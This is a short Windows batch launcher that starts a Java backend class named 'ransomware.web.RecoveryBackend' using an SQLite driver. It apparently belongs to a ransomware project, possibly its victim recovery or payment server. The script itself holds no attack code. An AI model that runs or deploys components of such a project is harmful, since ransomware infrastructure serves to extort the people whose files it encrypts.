@echo off
chcp 65001 > nul
cd /d "%~dp0"
java -cp "extras\Helper.jar;lib\sqlite-jdbc.jar" ransomware.web.RecoveryBackend
pause
